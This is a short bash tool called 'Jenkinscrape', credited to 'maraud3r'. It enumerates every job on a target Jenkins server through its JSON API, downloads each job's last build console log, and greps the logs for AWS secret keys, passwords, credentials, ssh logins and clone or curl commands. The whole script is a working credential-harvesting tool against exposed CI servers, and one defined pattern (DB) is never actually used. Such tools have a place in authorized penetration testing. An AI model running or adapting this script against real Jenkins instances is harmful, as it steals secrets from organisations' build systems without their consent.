#!/bin/bash
cat<<1337


     ██╗███████╗███╗   ██╗██╗  ██╗███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗
     ██║██╔════╝████╗  ██║██║ ██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
     ██║█████╗  ██╔██╗ ██║█████╔╝ ███████╗██║     ██████╔╝███████║██████╔╝█████╗  
██   ██║██╔══╝  ██║╚██╗██║██╔═██╗ ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  
╚█████╔╝███████╗██║ ╚████║██║  ██╗███████║╚██████╗██║  ██║██║  ██║██║     ███████╗
 ╚════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝

                                                                 by maraud3r
1337

JENKINS="https://$1"
SCRAPEDIR=$(mktemp -d)
echo "[*] Scraping will be stored in ${SCRAPEDIR}"
echo -n "[*] Collecting job list..............."
curl -s "${JENKINS}/api/json?pretty=true" | jq '.jobs[]|.url ' | sed 's/"//g' | cat > ${SCRAPEDIR}/jobs.lst
echo "DONE"
TOT_JOBS=$(wc -l ${SCRAPEDIR}/jobs.lst | cut -d' ' -f 1)
NUM=1

while read JOB
do
    echo -ne "[*] Scraping jobs.............[$NUM/$TOT_JOBS]\r"
    SCRAPEFILE=${SCRAPEDIR}/$NUM.txt
    curl -s $JOB/lastSuccessfulBuild/consoleText | sort -u  > ${SCRAPEFILE}

    GIT="git clone "
    AWS="AWS_SECRET_KEY|AWS_ACCESS_KEY_ID"
    TAR="tar -?[xvfz] "
    SSH="ssh \w+\@"
    CURL="curl "
    DB="mysql -|psql -|mongo "
    PASS="password |passphrase |pwd |credentials |userpass "
    grep -Pa "(${GIT}|${AWS}|${TAR}|${SSH}|${CURL}|${PASS})" ${SCRAPEFILE} >> ${SCRAPEDIR}/scraping.res

    rm ${SCRAPEFILE}
    
    NUM=$(($NUM+1))
done<${SCRAPEDIR}/jobs.lst
echo "[*] Scraping jobs.....................DONE"

echo -n "[*] Sorting and fixing up output......"
sort -u -o ${SCRAPEDIR}/scraping.res ${SCRAPEDIR}/scraping.res
echo "DONE"
